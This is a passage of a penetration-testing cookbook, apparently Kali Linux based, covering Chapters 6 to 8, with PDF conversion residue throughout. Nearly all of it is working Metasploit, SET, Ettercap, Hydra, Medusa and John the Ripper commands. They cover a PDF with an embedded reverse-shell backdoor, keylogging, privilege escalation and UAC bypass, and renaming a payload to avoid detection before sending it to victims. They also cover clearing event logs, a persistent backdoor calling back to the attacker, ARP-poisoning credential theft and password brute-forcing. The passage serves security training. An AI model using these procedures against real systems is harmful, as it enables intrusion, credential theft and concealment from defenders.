Getting ready

The following requirement needs to be fulfilled:

    A connection to the internal network

    Metasploitable running in our hacking lab
    Wordlist to perform dictionary attack

How to do it...

Let's begin the recipe by opening a terminal window:

1.   Open a command prompt.

2.   Launch the MSFCONSOLE:

msfconsole

163

![](images/00157.jpeg)

Exploiting Vulnerabilities

3.   Search for all the available Tomcat modules:

search tomcat

4.   Use the Tomcat Application Manager Login Utility:

use auxiliary/scanner/http/tomcat_mgr_login

5.   Show the available options of the module:

show options

Notice that we have a lot of items that are set to yes and are required. We will utilize their defaults.

6.   SetPass_File:

PASS_FILE meset  /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt

7.   SetUser_File:

USER_FILE mset  /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt

8.   Set the targetRHOST. In this case, we will select our Metasploitable 2 machine:
             set RHOSTS  192.168.10.111

9.   SetRPORTto8180:

set RPORT  8180

10\. Run the exploit:

exploit

164

![](images/00158.jpeg)

Chapter 6

How it works...

In this recipe, we used Metasploits MSFCONSOLE to exploit a Tomcat vulnerability on our

target Metasploitable 2 host. We began by launching the console and searching for all known Tomcat vulnerabilities. After choosing the Tomcat login exploit, which allows us to brute force the Tomcat login, we set our options and executed the exploit. Metasploit goes out and tries to enter a combination of all usernames and passwords contained in both the files. Locate the+ sign next to the login and password combination that works.

Metasploitable PDF

In this recipe, we will explore how to use Metasploit to perform an attack using thePortable
Document Format(PDF) document exploited with the Adobe PDF Embedded module. An
Adobe PDF is a highly used standard for transmitting a document to another party. Due to its
widespread use, especially because of its business usage, we will attack a user's machine by
allowing them to think they are opening a legitimate PDF document from a job applicant.

Getting ready

The following requirement needs to be fulfilled:

    A connection to the internal network

    Metasploitable running in our hacking lab
    Wordlist to perform dictionary attack

How to do it...

Let's begin the process by opening a terminal window:

1.   Open a terminal window.

2.   Launch the MSFCONSOLE:

msfconsole

165

![](images/00159.jpeg)

Exploiting Vulnerabilities

3.   Search for all the available PDF modules:

search pdf

4.   Use the Adobe PDF Embedded EXE Social Engineering:

use exploit/windows/fileformat/adobe_pdf_embedded_exe

5.   Show the available options of the module:

show options

166

![](images/00160.jpeg)

Chapter 6

6.   Set the filename of the PDF we want to generate:

set FILENAME evildocument.pdf

7.   Set theINFILENAME option. This is the location of a PDF file that you have access
 to use. In this case, I am using a resume located on my desktop:

set INFILENAME  /root/Desktop/willie.pdf

Notice that all of the options for this module are set to optional with the exception of theINFILENAME option.

8.   Run the exploit:

Exploit

How it works...

In this recipe, we used Metasploit's MSFCONSOLE to exploit and create an Adobe PDF file

containing a Meterpreter backdoor. We began by launching the console and searching for all
known PDF vulnerabilities. After choosing the Embedded EXE PDF exploit, which allows us
to hide a backdoor program in a legitimate PDF, we set our options and executed the exploit.
Metasploit will generate a PDF accompanied by a Windows Reverse TCP Payload. When your
target opens the PDF file, Meterpreter will open acknowledging and activate the session.

Implementing browser_autopwn

Browser Autopwn is an auxiliary module provided by Metasploit that allows you to automate an attack on a victim machine simply when they access a webpage. Browser Autopwn performs a fingerprint of the client before it attacks; meaning that it will not try a Mozilla Firefox exploit against an Internet Explorer 7 browser. Based upon its determination of browser, it decides which exploit is the best to deploy.

Getting ready

A connection to the Internet or internal network is required to complete this recipe.

167

![](images/00161.jpeg)

Exploiting Vulnerabilities

How to do it...

Let's begin by opening a terminal window:

1.   Open a terminal window.

2.   Launch the MSFCONSOLE:

msfconsole

3.   Search for theautopwn modules:
             Search autopwn

4.   Use thebrowser_autopwn module:

Use auxiliary/server/browser_autopwn

5.   Set our payload. In this case we use Windows Reverse TCP:

set payload windows/meterpreter/reverse_tcp

6.   Show the options for this type of payload:

show options

7.   Set the host IP address where the reverse connection will be made. In this case,
 the IP address of the PC is192.168.10.109:

set LHOST  192.168.10.109

8.   Next, we want to set our URIPATH. In this case we use"filetypes" (with quotes):
             set URIPATH "filetypes"

9.   Finally, we start the exploit:

exploit

10\. Metasploit starts the exploit at the IP addresshttp://[Provided IP
 Address]:8080.

11\. When a visitor visits the address, thebrowser_autopwn module tries to connect
 to the user's machine to set up a remote session. If successful, Meterpreter will
              acknowledge the session. To activate the session, use the session command:

session  -I  1

168

![](images/00162.jpeg)

Chapter 6

12\. To show a list of Meterpreter commands that we can run, typehelp:
             help

13\. A list of available commands will display. In this case, we will start a keystroke scan:

keyscan_start

14\. To get the keystrokes that were taken from our victim, we issue the
             keyscan_dump command:

keyscan_dump

How it works...

In this recipe, we used Metasploit's MSFCONSOLE to launch abrowser_autopwnexploit. We began by launching the console and searching for all knownautopwn modules. After choosing theautopwnmodule, we set our payload towindows_reverse_tcp; which allows us to get a connection back to us if the exploit was successful. Once a victim visits our webpage, and an exploit was successful, we will get an active Meterpreter session.

169

![](images/00004.jpeg)

7

Escalating Privileges

In this chapter, we will cover:

    Using impersonation tokens

    Local privilege escalation attack

    Mastering the Social Engineering Toolkit (SET)    Collecting the victim's data

    Cleaning up the tracks

    Creating a persistent backdoor
    Man In The Middle (MITM) attack

Introduction

Once we have gained access to the computer that we would like to attack, it's important

that we escalate our privileges as much as possible. Generally, we gain access to a user

account that has low privileges (the computer user); however, our target account may be the
administrator account. In this chapter we will explore various ways to escalate your privileges.

Using impersonation tokens

In this recipe, we will impersonate another user on a network by using impersonation tokens.
Tokens contain the security information for a login session and identifies the user, the user's
groups, and the user's privileges. When a user logs into a Windows system, they are given
an access token as a part of their authenticated session. Token impersonation allows us to
escalate our privileges by impersonating that user. A system account, for example, may need
to run as a domain administrator to handle a specific task and it generally relinquishes its
elevated authority when done. We will utilize this weakness to elevate our access rights. ![](images/00005.jpeg)![](images/00005.jpeg)![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00163.jpeg)

Escalating Privileges

Getting ready

To execute this recipe we will need the following:
                 A connection to the Internet or intranet
                 A victim target machine is also required

How to do it...

We begin our exploration of impersonation tokens from a Meterpreter shell. You will have to
use Metasploit to attack a host in order to gain a Meterpreter shell. You can use one of the
recipes inChapter 6,Exploiting Vulnerabilities, to gain access to a host using Metasploit.

The steps are as follows:

1.   From Meterpreter we can begin the impersonation process by usingincognito:
             use incognito

2.   Display thehelpfile for incognito by issuing thehelp command:
             help

3.   You will notice that we have several options available:

4.   Next we want to get a list of available users who are currently logged into the
 system or have had access to the system recently. We do this by executing the
             list_tokenscommand with the-u option:

list_tokens  -u

172

![](images/00164.jpeg)

Chapter 7

5.   Next, we run the impersonation attack. The syntax to use isimpersonate_token
 [name of the account to impersonate]:

impersonate_token  \\willie-pc\willie

6.   Finally, we run a shell command. If we are successful, we are now using the current
 system as another user.

How it works...

In this recipe, we began with a compromised host and then used Meterpreter to impersonate the token of another user on the machine. The goal of the impersonation attack is to choose the highest level of user possible, preferably someone who is also connected across a
domain, and use their account to dive further into the network.

Local privilege escalation attack

In this recipe, we will escalate privileges on a compromised machine. Local privilege escalation allows us to gain access to system or domain user accounts, utilizing the current system to which we are attached.

Getting ready

To execute this recipe we will need the following:
                 A connection to the Internet or intranet

    A compromised machine using the Metasploit framework is also required

173

![](images/00165.jpeg)

Escalating Privileges

How to do it...

Let's begin the process of performing a local privilege escalation attack from a Meterpreter shell. You will have to use Metasploit to attack a host in order to gain a Meterpreter shell. You can use one of the recipes inChapter 6,Exploiting Vulnerabilities, to gain access to
a host using Metasploit.

1.   Once you have gained access to your victim using a Metasploit exploit

with a Meterpreter payload, await for your Meterpreter prompt to display:

2.   Next, to view thehelpfile for thegetsystemcommand, we run the-h option:
             getsystem  -h

3.   Finally, we run getsystem without any attributes:

getsystem

If you are trying to gain access to a Windows 7 machine, you must run the
bypassuaccommand before you can run thegetsystem command.
BypassUAC allows you to bypass the Microsoft User Account Control
(http://windows.microsoft.com/en-us/windows7/products/
features/user-account-control). The command is run as follows:

run post/windows/escalate/bypassuac

4.   Next, we execute the final command to gain access.

5.   That's it! We have successfully performed an escalation attack!

How it works...

In this recipe, we used Meterpreter to perform a local privilege escalation attack on our victim

machine. We began the recipe from a Meterpreter shell. We then ran thegetsystem command that allows Meterpreter to try and elevate our credentials on the system. If successful, we will have system level access on our victim's machine.

174

![](images/00166.jpeg)

Chapter 7

Mastering the Social Engineering Toolkit (SET)

In this recipe, we will explore theSocial Engineering Toolkit(SET). SET is a framework that

includes tools that allow you to attack a victim by using deception. SET was designed byDavid
Kennedy. The tool has quickly become a standard in the arsenal of the penetration tester.

How to do it...

The steps for mastering the SET are as follows:

1.   Open a terminal window by pressing the terminal icon and visit the directory
 containing SET:

se-toolkit

2.   Once accepted, you will be presented with the SET menu. The SET menu has the
 following options:

     Social-Engineering Attacks

     Fast-Track Penetration Testing     Third Party Modules

     Update the Metasploit Framework
     Update the Social-Engineer Toolkit
     Update SET configuration
     Help, Credits, and About
     Exit the Social-Engineer Toolkit

Before running an attack, it's a good idea to update SET as updates come frequently from the author.

175

![](images/00167.jpeg)

Escalating Privileges

The options can be seen in the following screenshot:

3.   For our purposes, we will choose the first option to launch a social engineering attack:

1

4.   We are now presented with a list of social engineering attacks as shown in the
 following screenshot. For our purposes, we will use theCreate a Payload and
 Listener(option4):

4

176

![](images/00168.jpeg)

Chapter 7

5.   Next, we are asked to enter the IP address for the payload to reverse connect.
 In this case, we type in our IP address:

192.168.10.109

177

![](images/00169.jpeg)

Escalating Privileges

6.   You will be presented with a listing of payloads to generate for thePayload and
 Listeneroption as well as their descriptions. ChooseWindows Reverse_TCP
              Meterpreter. This will allow us to connect to our target and execute Meterpreter
 payloads against it:

2

7.   Finally, you will be asked for a port to designate as the listener port. Port 443 is
 already chosen for you and we will choose this option.

443

8.   Once the payload has been completed, you will be asked to start the listener.
 EnterYes:

178

![](images/00170.jpeg)

Chapter 7

9.   You will notice that Metasploit opens a handler:

How it works...

In this recipe, we explored the use of SET. SET has a menu style interface that makes it

extremely simple to generate tools we can use to deceive our victims. We began by initiating SET. After doing so, SET provides us with several choices of exploits that we can run. Once we chose our attack, SET begins interacting with Metasploit while asking the user a series of questions. At the conclusion of our recipe, we created an executable that will provide us with an active Meterpreter session to the targeted host.

There's more...

Alternatively, you can launch SET from the desktop go toApplications|Kali Linux |
Exploitation Tools|Social Engineering Tools|Social Engineering Toolkit|Set.

Delivering your payload to the victim

The steps for delivering your payload to the victim are as follows:

1.   In theSETdirectory, you will notice there is an EXE titledmsf.exe. It is recommended
 to change the name of the file to something else to avoid detection. In this case, we will
              change it toexplorer.exe. To begin the process, we open a terminal window and
 navigate to the directory where SET is located:

cd  /usr/share/set

2.   We then get a listing of all items in the directory:

ls

179

![](images/00171.jpeg)

Escalating Privileges

3.   Next we want to rename our file toexplorer.exe:
             mv msf.exe explorer.exe

4.   Now we will ZIP ourexplorer.exe payload. In this case, the ZIP archive is called
             healthyfiles:

zip healthyfiles explorer.exe

5.   Now that you have the ZIP archive, you can distribute the file to your victim in various
              ways. You can ZIP the file (it should bypass most e-mail systems), you can place the
              file on a USB key and manually open on the victim's machine, and so on. Explore the
              mechanism that will give you the results you desire to reach your goals.

Collecting the victim's data

In this recipe, we will explore how to collect data from a victim by using Metasploit. There are several ways to accomplish this task, but we will explore recording a user's keystrokes on the compromised machine. Collecting a victim's data allows us to potentially gain additional information that we can use for further exploits. For our example, we will collect keystrokes entered by a user on a compromised host.

Getting ready

To execute this recipe we will need the following:
                 A connection to the Internet or intranet

    A compromised machine using the Metasploit framework is also required

How to do it...

Let's begin the process of collecting data from a victim from a Meterpreter shell. You will have
to use Metasploit to attack a host in order to gain a Meterpreter shell. You can use one of the
recipes inChapter 6,Exploiting Vulnerabilities, to gain access to a host using Metasploit.

180

![](images/00172.jpeg)

Chapter 7

1.   Once you have gained access to your victim using a Metasploit exploit with a
 Meterpreter payload, await for your Meterpreter prompt to display:

2.   Next, we execute the following command to begin the keylogger:

keyscan_start

3.   Finally, we issue thekeyscan_dump command to output the user's keystrokes
 to the screen:

keyscan_dump

How it works...

In this recipe, we collected data from a victim using Meterpreter.

There's more...

There are several different ways you can approach collecting data from a victim's machine. In this recipe, we used Metasploit and a Meterpreter keyscan to record keystrokes, but we could have easily used Wireshark or airodump-ng to collect the data.

The key here is to explore other tools so that you can find which tool you like best to accomplish your goal.

Cleaning up the tracks

In this recipe we will use Metasploit to erase our tracks. Cleaning up after compromising a host is an extremely important step because you don't want to go through all of the trouble of gaining access only to get caught. Luckily for us, Metasploit has a way for us to clean up our tracks very easily.

181

![](images/00173.jpeg)

Escalating Privileges

Getting ready

To execute this recipe we will need the following:
                 A connection to the Internet or intranet

    A compromised machine using the Metasploit framework is also required

How to do it...

The steps to be performed are as follows:

1.   Let's begin the process of cleaning our tracks from a Meterpreter shell. You will have
 to use Metasploit to attack a host in order to gain a Meterpreter shell. You can use one
              of the recipes inChapter 6,Exploiting Vulnerabilities, to gain access to a host using
              Metasploit. Once you have gained access to your victim using a Metasploit exploit with
 a Meterpreter payload, await for your Meterpreter prompt to display:

2.   Next, we need to run the IRB in order to begin the log removal process. We open the
             help file:

irb

3.   Next, we tell the IRB which log we would like to remove. Following are some
 available choices.

 log  = client.sys.eventlog.open('system')

    log  = client.sys.eventlog.open('security')

    log  = client.sys.eventlog.open('application')

    log  = client.sys.eventlog.open('directory service')    log  = client.sys.eventlog.open('dns server')
    log  = client.sys.eventlog.open('file replication
              service')

182

![](images/00174.jpeg)

Chapter 7

4.   For our purposes, we will clear them all. You will have to type these in one at a time.

log  = client.sys.eventlog.open('system')

log  = client.sys.eventlog.open('security')

log  = client.sys.eventlog.open('application')

log  = client.sys.eventlog.open('directory service')

log  = client.sys.eventlog.open('dns server')

log  = client.sys.eventlog.open('file replication service')

5.   Now, we execute our command to erase the log files:

Log.clear

6.   That's it! With just a few commands we have been able to cover our tracks!

How it works...

In this recipe, we used Meterpreter to cover our tracks on a compromised host. We began the recipe from a Meterpreter shell and started the IRB (a Ruby interpreter shell). Next, we specified exactly which files we wanted to have removed and concluded the recipe by issuing theLog.clear command to clear the logs. Remember, you want to perform this step last, once we compromise a host; you don't want to perform another function after covering your tracks only to add more log entries, and so on.

Creating a persistent backdoor

In this recipe, we will create a persistent backdoor using the Metasploit persistence. Once you have succeeded in gaining access to a compromised machine, you will want to explore ways to regain access to the machine without having to break into it again. If the user of
the compromised machine does something to disrupt the connection, such as reboot the
machine, the use of a backdoor will allow a connection to re-establish to your machine.
This is where creating a backdoor comes in handy because it allows you to maintain access to a previously compromised machine.

Getting ready

To execute this recipe we will need the following:
                 A connection to the Internet or intranet

    A compromised machine using the Metasploit framework is also required

183

![](images/00175.jpeg)

Escalating Privileges

How to do it...

Let's begin the process of installing our persistent backdoor. You will have to use Metasploit to attack a host in order to gain a Meterpreter shell. You can use one of the recipes inChapter 6,Exploiting Vulnerabilities, to gain access to a host using Metasploit.

1.   Once you have gained access to your victim using a Metasploit exploit with a
 Meterpreter payload, await for your Meterpreter prompt to display:

2.   Next, we need to run persistence in order to set up our backdoor. We open the
             help file:

run persistence  -h

3.   The persistence backdoor has many options, including:

             -A: This option automatically starts a matching multihandler to connect

to the agent.

             -S: This option allows the backdoor to automatically start as a system

service.

             -U: This option allows the backdoor to automatically start when the user

boots the system.

             -i: This option sets the number of seconds between attempts back to

the attacker machine (in seconds).

             -p: This option sets the port to which Metasploit is listening on the

attacker machine.

             -P: This option sets the payload to use.Reverse_tcp is used by default

and is generally the one you want to use.

             -r: This option sets the IP address of the attacker machine.

4.   Now, we execute our command to set up the backdoor:

run persistence  -U  -A  -i  10  -  8090  -r  192.168.10.109

184

![](images/00176.jpeg)

Chapter 7

5.   The backdoor is now set! If successful, you will notice that you have a second
 Meterpreter session!

How it works...

In this recipe, we used Meterpreter to set up a persistent backdoor. We began the recipe after
having compromised the host and obtaining a Meterpreter shell. We then explored some
of the available options to persistence by reviewing its help file. Finally, we completed the
installation of the backdoor by running the installation command and setting its options.

Man In The Middle (MITM) attack

In this recipe, we will use aMan In The Middle(MITM) attack against one of our targets.

A MITM attack works by allowing us to eavesdrop on the communication between our target
and their legitimate party. For our example, we could utilize Ettercap to eavesdrop on the
communication of a Windows host while checking their e-mail onhttp://www.yahoo.com.

Getting ready

To execute this recipe we will need the following:
                 A wireless connection to the network

    A machine on the network connected to the wireless network

185

![](images/00177.jpeg)

Escalating Privileges

How to do it...

Let's begin the Man In The Middle attack by launching Ettercap.

1.   Open a terminal window and start Ettercap. Using the-G option launches the GUI
 (Graphical User Interface):

ettercap  -G

2.   We begin the process by turning on unified sniffing. You can pressShift+U or use
              the menu and go toSniff|Unified sniffing..., as shown in the following screenshot:

186

![](images/00178.jpeg)

Chapter 7

3.   Select the network interface. In the case of using a MITM attack, we should select our
 wireless interface:

4.   Next, we turn on the scan for hosts. This can be accomplished by pressingCtrl+S or
              use the menu and go toHosts|Scan for hosts as shown in the following screenshot:

5.   Next, we bring up the hosts lists. You can either pressH or use the menu and go to
             Hosts|Host List:

187

![](images/00179.jpeg)

Escalating Privileges

6.   Next, we need to select and set our targets. In our case, we will select192.168.10.111
             as our target 1 by highlighting its IP address and pressing theAdd To Target 1 button:

7.   Now, we are able to allow Ettercap to begin sniffing. You can press eitherCtrl+W
             or use the menu and go toStart|Start Sniffing:

8.   Finally, we begin the ARP poisoning process. From the menu, go toMitm|Arp
 poisoning...

188

![](images/00180.jpeg)

Chapter 7

9.   In the window that appears, check the optional parameter forSniff remote
 connections.:

10\. Depending on the network traffic, we will begin to see the following information:

189

![](images/00181.jpeg)

Escalating Privileges

11\. Once we have found what we are looking for (usernames and passwords). We will
              turn off Ettercap. You can do this by either pressingCtrl+E or by using the menu
 and going toStart|Stop sniffing:

12\. Now we need to turn off ARP Poisoning and return the network back to normal:

How it works...

This recipe included a MITM attack that works by using ARP packet poisoning to eavesdrop on wireless communications transmitted by a user.

You can learn more about Man In The Middle attacks by visiting

http://en.wikipedia.org/wiki/Man-in-the-middle_ attack#Example_of_an_attack.

190

8

Password Attacks

In this chapter, we will cover:

    Online password attacks
    Cracking HTTP passwords
    Gaining router access
    Password profiling

    Cracking a Windows password using John the Ripper    Using dictionary attacks

    Using rainbow tables

    Using nVidia Compute Unified Device Architecture (CUDA)    Using ATI Stream

    Physical access attacks

Introduction

In this chapter, we will explore various ways to crack passwords to gain access to user

accounts. Cracking passwords is a task that is used by all penetration testers. Inherently, the most insecure part of any system is the passwords submitted by users. No matter the password policy, humans inevitably hate entering strong passwords or resetting them as often as they should. This makes them an easy target for hackers. ![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00182.jpeg)

Password Attacks

Online password attacks

In this recipe we will use the THC-Hydra password cracker (Hydra). There are times in which we will have the time to physically attack a Windows-based computer and obtain theSecurity Account Manager(SAM) directly. However, there will also be times in which we are unable to do so and this is where an online password attack proves most beneficial.

Hydra supports many protocols, including (but not limited to) FTP, HTTP, HTTPS, MySQL,

MSSQL, Oracle, Cisco, IMAP, VNC, and many more! Be careful though, as this type of attack can be a bit noisy, which increases your chance of getting detected.

Getting ready

A connection to the Internet or intranet as well as a computer that we can use as our victim is required to complete this recipe.

How to do it...

So let's begin the process of cracking an online password.

1.   From the Start menu, selectApplications|Kali Linux|Password Attacks|Online
 Attacks|hydra-gtk.

192

![](images/00183.jpeg)

Chapter 8

2.   Now that we have Hydra started, we will need to set our word lists. Click on the

Passwordstab. We will use a username list and a password list. Enter the location of your username and password list. Also selectLoop around usersandTry
empty password.

     Username List:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-
              user-passwd/names/nameslist.txt

     Password List:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-
              user-passwd/passwds/john.txt

A shortcut you can use is to single click inside the
wordlist box to bring up a filesystem window.

193

![](images/00184.jpeg)

Password Attacks

3.   Next, we will tune the attack. UnderPerformance Options, we set the number

of tasks from16to2. The reason for this is that we do not want to have so many processes running that we bring down the server. Although optional, we also want to set theExit after first found pair option.

4.   Finally, we will go after our target. Click on theTarget tab and set our target and
 protocol that we wish to attack. In our case, we are using the MySQL port of our
 Metasploitable machine (192.168.10.111).

194

![](images/00185.jpeg)

Chapter 8

5.   Finally, we execute the exploit by clicking on theStart tab and pressing the
             Start button.

195

![](images/00186.jpeg)

Password Attacks

How it works...

In this recipe, we used Hydra to perform a dictionary attack against our target. Hydra works
by allowing us to specify a target, and using the username and password lists. It attempts
to brute-force passwords by using various combinations of usernames and passwords from
both lists.

Cracking HTTP passwords

In this recipe, we will crack HTTP passwords using the THC-Hydra password cracker

(Hydra). Access to websites and web applications are generally controlled by username and password combinations. As with any other password type, users typically type in
weak passwords.

Getting ready

A connection to the Internet or intranet and a computer that we can use as our victim are required to complete this recipe.

How to do it...

Let's begin the process of cracking HTTP passwords.

1.   From the Start menu, selectApplications|Kali Linux|Password Attacks|Online
 Attacks|hydra-gtk.

196

![](images/00187.jpeg)

Chapter 8

2.   Now that we have Hydra started, we will need to set our word lists. Click on the

Passwordstab. We will use a username list and a password list. Enter the location of your username and password lists. Also selectLoop around usersandTry
empty password.

     Username List:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-
              user-passwd/names/nameslist.txt

     Password List:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-
              user-passwd/passwds/john.txt

197

![](images/00188.jpeg)

Password Attacks

A shortcut you can use is to single click inside of the wordlist box to bring up a filesystem window.

198

![](images/00189.jpeg)

Chapter 8

3.   Next, we will tune the attack. UnderPerformance Options, we set the number

of tasks from16to2. The reason for this is that we do not want to have so many processes running that we bring down the server. Although optional, we also want to set theExit after first found pair option.

199

![](images/00190.jpeg)

Password Attacks

4.   Finally, we will go after our target. Click theTarget tab and set our target and protocol
 that we wish to attack. In our case, we are using the HTTP port of our Metasploitable
machine (192.168.10.111).

200

![](images/00191.jpeg)

Chapter 8

5.   Finally, we execute the exploit by clicking on theStarttab and then theStart button.

Gaining router access

In this recipe, we will use a brute-force attack using Medusa.

These days, we are in a networked society. With networked video game systems, multiple
computers in most homes, and small businesses growing at a record pace, routers have
become the cornerstone of network communication. What hasn't increased is the number
of experienced network administrators to secure these routers, leaving many of these routers vulnerable to attack.

Getting ready

A connection to the Internet or intranet is required to complete this recipe. An available router is also required.

201

![](images/00192.jpeg)

Password Attacks

How to do it...

1.   From the Start menu, navigate toApplications|Kali Linux|Password Attacks |
             Online Attacks|medusa. When Medusa launches, it loads itshelp file.

2.   We now run Medusa with our chosen options:

medusa  -M http  -h  192.168.10.1  -u admin  -P  /usr/share/wfuzz/

wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt  -e ns  -n  80
-F

             -M http allows us to specify our module. In this case, we have chosen the

HTTP module.

             -h  192.168.10.1 allows us to specify our host. In this case, we have

chosen192.168.10.1 (the IP address of our router).

             -u admin allows us to specify our user. In this case, we have chosen admin.

             -P  [location of password list] allows us to specify our password

list location.

             -e nsallows us to specify additional password checks. Thens variable

allows us to use the username as a password and to use empty passwords.

202

![](images/00193.jpeg)

Chapter 8

             -n  80allows us to specify our port number. In this case we chose80.

             -F allows us to stop the audit after we have succeeded with a

username-password combination.

3.   Medusa will run and try all username and password combinations until
 one succeeds.

How it works...

In this recipe, we used Medusa to brute-force the password of our target router. The benefit of being able to do this is that once you have access to the router you can update its settings to allow you to access it again in the future or even reroute the traffic sent to the router to alternate locations of your choosing.

There's more...

You can also run Medusa directly from the command line by issuing themedusa command.

You can also pass other options to Medusa depending on your situation. Please see thehelpfile—by just typingmedusa in a terminal window—for more details.

Types of modules

The following is a list of modules that we can use with Medusa:

    AFP

    CVS
    FTP
    HTTP
    IMAP
    MS-SQL
    MySQL
    NetWare
    NNTP

    PCAnywhere
    Pop3

    PostgreSQL

203

![](images/00194.jpeg)

Password Attacks
                 REXEC

    RLOGIN
    RSH

    SMBNT

    SMTP-AUTH
    SMTp-VRFY
    SNMP

    SSHv2

    Subversion
    Telnet

    VMware Authentication
    VNC

    Generic Wrapper
    Web form

Password profiling

In this recipe, we will learn how to profile passwords before we begin our password attack. The purpose of profiling passwords is to allow us to get to a smaller wordlist by gathering information against our target machine, business, and so on. In this tutorial, we will use Ettercap and its ARP poisoning function to sniff traffic.

Getting ready

A connection to the local network is required to complete this recipe.

How to do it...

Let's begin the process of password profiling by launching Ettercap.

1.   We begin this recipe by configuring Ettercap. First, we locate its configuration file
              and edit it using VIM.

locate etter.conf
vi  /etc/etterconf

Note, your location may be different.

2.   Change theec_uidandec_gidvalues to0.

204

![](images/00195.jpeg)

Chapter 8

3.   Next we need to uncomment the followingIPTABLESlines under theLINUX section
 near the end of the file:

4.   Now, we are finally ready to launch Ettercap. Using the-G option, launch the
 Graphical User Interface (GUI).

ettercap  -G

205

![](images/00196.jpeg)

Password Attacks

5.   We begin the process by turning on unified sniffing. You can pressShift+U
             or by using the menu and navigating toSniff|Unified sniffing...

6.   Select the network interface.

7.   Next, we turn onScan for hosts. This can be accomplished by pressingCtrl+S
             or by using the menu and navigating toHosts|Scan for hosts.

8.   Now we are able to allow Ettercap to begin sniffing. You can press eitherCtrl + W
             or use the menu and navigate toStart|Start Sniffing.

206

![](images/00197.jpeg)

Chapter 8

9.   Finally, we begin the ARP poisoning process. From the menu, navigate
 toMitm|Arp poisoning.

10\. In the window that appears, check the optional parameter forSniff
              remote connections.

11\. Depending on the network traffic, we will begin to see the information.

207

![](images/00198.jpeg)

Password Attacks

12\. Once we have found what we are looking for (usernames and passwords). We will
              turn off Ettercap. You can do this by either pressingCtrl+E or by using the menu
 and navigating toStart|Stop sniffing.

13\. Now we need to turn off ARP poisoning and return the network back to normal.

How it works...

In this recipe, we have used Ettercap to poison a network and steal usernames and passwords from the network. We began the recipe by locating and altering Ettercap's configuration file. Next we launched Ettercap and executed a Man In The Middle (MITM) attack using ARP
poisoning. As the traffic is redirected to our machine, we will be able to see usernames and passwords as they are transmitted by users on the network.

There's more...

We can also use Metasploit to profile usernames as well. We will perform this by using the search email collector module.

1.   Open a terminal window and begin MSFCONSOLE:

msfconsole

2.   Search for the email collector:

search email collector

208

![](images/00199.jpeg)

Chapter 8

3.   Issue the command to use the search email collector module:

use auxiliary/gather/search_email_collector

4.   Show the available options for the module:

show options

5.   Next we set our domain name.Please be careful with your choice! You do not want
 federal authorities at your door!

6.   Set the domain with your desired domain name.

set domain    gmail.com

209

![](images/00200.jpeg)

Password Attacks

7.   Set the output file. This does not have to be done and is optional. It's recommended
 to use this if you are going to run several attacks or if you want to be able to run an
 attack at a later time.

set outfile  /root/Desktop/fromwillie.txt

8.   Finally, we run the exploit:

run

Cracking a Windows password using John the Ripper

In this recipe, we will utilize John the Ripper (John) to crack a WindowsSecurity Access

Manager(SAM) file. The SAM file stores the usernames and password hashes of users of

the target Windows system. For security reasons, the SAM file is protected from unauthorized access by not being able to be opened manually or be copied while the Windows system is
in operation.

Getting ready

You will need access to a SAM file.

For this recipe, we will assume that you have gained access to a Windows host machine.

How to do it...

Let's begin the process of cracking a Windows SAM file using John the Ripper. We are assuming that you have accessed the Windows machine via either a remote exploit hack or you have
physical access to the computer and are using Kali Linux on a USB or DVD-ROM drive.

1.   Check for the hard drive you wish to mount:

Fdisk  -l

210

![](images/00201.jpeg)

Chapter 8

2.   Mount the hard drive and settarget as its mount point:
             mount  /dev/sda1  /target/

3.   Change directories to the location of the Windows SAM file:

cd  /target/windows/system32/config

4.   List all of the contents of the directory:

ls  -al

5.   Use SamDump2 to extract the hash and place the file in your root user directory in a
 folder calledhashes:

samdump2 system SAM  >  /root/hashes/hash.txt

6.   Change directories to the directory of John the Ripper:

cd  /pentest/passwords/jtr

7.   Run John the Ripper:

./john  /root/hashes/hash.txt

./john  /root/hashes/hash.txt-f:nt              (If attacking a file on a NTFS

System)

Using dictionary attacks

In this recipe, we will examine dictionary or wordlist attacks. A dictionary attack uses a

predetermined set of passwords and attempts to brute-force a password match for a given

user against the wordlist. There are three types of dictionary lists that are generally generated:

    Username Only: Lists that contain generated usernames only

    Password Only: Lists that contain generated passwords only

    Username and Password Lists: Lists that contain both generated usernames
 and passwords

For our demonstration purposes, we will utilize Crunch to generate our very own password dictionary.

Getting ready

This recipe requires an installation of Crunch on your Kali installation

211

![](images/00202.jpeg)

Password Attacks

How to do it...

The good thing about Kali Linux, unlike BackTrack, is that Kali already includes Crunch.

1.   Open a terminal window and enter thecrunch command in order to see the Crunch
 help file:

crunch

2.   The basic syntax for generating a password with Crunch iscrunch  [minimum
 length]  [maximum length]  [character set]  [options]

3.   Crunch has several options available. Some of the most commonly used options are:

             - o: this option allows you to specify a filename and location to output

the wordlist.

             -b: this option allows you to specify the maximum number of bytes to

write per file. Sizes can be specified in KB/MB/GB and must be used in

conjunction with the-o START trigger.

             -t: this option allows you to specify a pattern to use.

             -l: this option allows you to identify literal characters for some of the

placeholders when using the-toption (@,%,^).

4.   Next, we execute the command to create a password list on our desktop that has a
 minimum of 8 characters, a maximum of 10 characters, and using a character set of
             ABCDEFGabcdefg0123456789.

crunch  8  10 ABCDEFGabcdefg0123456789  -o  /root/Desktop/ generatedCrunch.txt

212

![](images/00203.jpeg)

Chapter 8

5.   Once the file has been generated, we use Nano to open the file:

nano  /root/Desktop/generatedCrunch.txt

How it works...

In this recipe we used Crunch to generate a password dictionary list.

Using rainbow tables

In this recipe, we will learn about how to use rainbow tables with Kali. Rainbow tables are special dictionary tables that use hash values instead of standard dictionary passwords to achieve the attack. For our demonstration purposes, we will use RainbowCrack to generate our rainbow tables.

How to do it...

1.   Open a terminal window and change directories to the directory ofrtgen:
             cd  /usr/share/rainbowcrack/

2.   Next we are going to runrtgen to generate an MD5-based rainbow table:
             ./rtgen md5 loweralpha-numeric  1  5  0  3800  33554432  0

213

![](images/00204.jpeg)

Password Attacks

3.   Once your tables have been generated—a process that depends on the number of

processors being used to generate the hashes (2-7 hours)—your directory will contain*.rt files.

4.   To begin the process of cracking the passwords, we will use thertsort program
 to sort the rainbow tables to make it an easy process.

How it works...

